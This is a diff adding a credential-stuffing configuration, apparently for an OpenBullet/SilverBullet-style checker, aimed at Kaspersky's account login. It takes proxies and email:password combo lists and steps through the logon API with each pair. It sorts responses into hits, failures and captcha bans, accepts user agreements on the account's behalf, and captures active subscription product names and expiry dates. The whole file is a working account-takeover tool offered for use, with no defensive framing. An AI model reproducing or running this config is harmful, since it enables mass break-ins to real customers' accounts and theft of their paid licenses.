@@ -1,0 +1,145 @@
+[SETTINGS]
+{
+  "Name": "KASPERSKY.COM",
+  "SuggestedBots": 50,
+  "LastModified": "2018-11-19T20:24:34.4554964+08:00",
+  "AdditionalInfo": "",
+  "Author": "Charles5624",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#REQUEST_ENG REQUEST GET "https://my.kaspersky.com/en" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  COOKIE "_UserCulture: en" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://my.kaspersky.com/" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+#REQUEST_LOGON REQUEST POST "https://hq.uis.kaspersky.com/v3/logon/start" AutoRedirect=TRUE 
+  CONTENT "{\"Realm\":\"https://center.kaspersky.com/\"}" 
+  CONTENTTYPE "application/json" 
+  COOKIE "_UserCulture: en" 
+  HEADER "Accept: application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Origin: https://my.kaspersky.com" 
+  HEADER "Referer: https://my.kaspersky.com/?returnUrl=%2fMyLicenses" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Success OR 
+    KEY "Status\":\"CredentialsRequired" 
+#PARSE_CONTEXT PARSE "<SOURCE>" JSON "LogonContext" Recursive=FALSE -> VAR "CONTEXT" "" "" 
+#AUTH_STAGE REQUEST POST "https://hq.uis.kaspersky.com/v3/logon/proceed" AutoRedirect=TRUE 
+  CONTENT "{\"logonContext\":\"<CONTEXT>\",\"login\":\"<USER>\",\"password\":\"<PASS>\",\"locale\":\"en\"}" 
+  CONTENTTYPE "application/json" 
+  COOKIE "_UserCulture: en" 
+  HEADER "Accept: application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Origin: https://my.kaspersky.com" 
+  HEADER "Referer: https://my.kaspersky.com/?returnUrl=http%3a%2f%2fmy.kaspersky.com%2fMyLicenses" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "\"Success\"" 
+  KEYCHAIN Failure OR 
+    KEY "InvalidRegistrationData" 
+  KEYCHAIN Ban OR 
+    KEY "InvalidCaptchaAnswer" 
+#REQUEST_ACTIVE REQUEST POST "https://hq.uis.kaspersky.com/v3/logon/complete_active" AutoRedirect=TRUE 
+  CONTENT "{\"logonContext\":\"<CONTEXT>\",\"TokenType\":\"SamlDeflate\",\"RememberMe\":false}" 
+  CONTENTTYPE "application/json" 
+  COOKIE "_UserCulture: en" 
+  HEADER "Accept: application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Origin: https://my.kaspersky.com" 
+  HEADER "Referer: https://my.kaspersky.com/?returnUrl=http%3a%2f%2fmy.kaspersky.com%2fMyLicenses" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Success OR 
+    KEY "UserToken" 
+#PARSE_TOKEN2 PARSE "<SOURCE>" JSON "UserToken" Recursive=FALSE -> VAR "TOKEN2" "" "" 
+#REQUEST_REST_LOGON REQUEST POST "https://my.kaspersky.com/SignIn/CompleteRestLogon" AutoRedirect=TRUE 
+  CONTENT "{\"samlDeflatedToken\":\"<TOKEN2>\",\"returnUrl\":\"http://my.kaspersky.com/\",\"resendActivationLink\":false,\"rememberMe\":false}" 
+  CONTENTTYPE "application/json" 
+  COOKIE "_UserCulture: en" 
+  HEADER "Accept: application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Origin: https://my.kaspersky.com" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "Referer: https://my.kaspersky.com/?returnUrl=http%3a%2f%2fmy.kaspersky.com%2fMyLicenses" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Success OR 
+    KEY "returnUrl" 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "ShowExpiredPasswordDialog\":true" 
+#REQUEST_AUTH REQUEST GET "https://my.kaspersky.com/en/Tokens/MyKasperskyAuth" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://my.kaspersky.com/?returnUrl=http%3a%2f%2fmy.kaspersky.com%2fMyLicenses" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Success OR 
+    KEY "Token" 
+    KEY "Redirect\":false" 
+#PARSE_TOKEN3 PARSE "<SOURCE>" JSON "Token" Recursive=FALSE -> VAR "TOKEN3" "" "" 
+#REQUEST_API REQUEST POST "https://uas.services.ucp.kaspersky-labs.com/portal-api/v1/acceptances" AutoRedirect=TRUE 
+  CONTENT "[{\"AgreementId\":{\"Type\":\"TermsOfUsage_MyK\",\"Version\":\"20180427\"},\"IsRejected\":false},{\"AgreementId\":{\"Type\":\"MarketingConsent_MyK\",\"Version\":\"Portal_MyKaspersky_MarketingConsent_MyK_20180711\"},\"IsRejected\":false},{\"AgreementId\":{\"Type\":\"WebPrivacyPolicy\",\"Version\":\"Portal_InfoSecurity_WebPrivacyPolicy_20180711\"}}]" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Host: uas.services.ucp.kaspersky-labs.com" 
+  HEADER "Origin: https://my.kaspersky.com" 
+  HEADER "Authorization: Bearer <TOKEN3>" 
+  HEADER "Referer: https:my.kaspersky.com/?returnUrl=http%3a%2f%2fmy.kaspersky.com%2fMyLicenses" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+#REQUEST_AGREEMENT REQUEST POST "https://my.kaspersky.com/FirstSignIn/UserAgreements" AutoRedirect=TRUE 
+  CONTENT "{\"returnUrl\":\"/MyLicenses\"}" 
+  CONTENTTYPE "application/json" 
+  COOKIE "_UserCulture: en" 
+  HEADER "Accept: application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Origin: https://my.kaspersky.com" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "Referer: https://my.kaspersky.com/?returnUrl=%2fMyLicenses" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+#REQUEST_LICENSE REQUEST GET "https://my.kaspersky.com/MyLicenses" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  COOKIE "_UserCulture: en" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://my.kaspersky.com/MyDevices" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+#Product PARSE "<SOURCE>" REGEX "\"ProductName\":\"([^\"]*).*?\"ExpirationDate\":\"(.*?)T" "ProductName: [1] | ExpirationDate: [2]" Recursive=TRUE -> CAP "Product" "" "" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Success OR 
+    KEY "\"LicenseTypeDisplayName\":\"subscription\",\"Title\":\"Active\"" 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "<SOURCE>" DoesNotContain "\"LicenseTypeDisplayName\":\"subscription\",\"Title\":\"Active\"" 
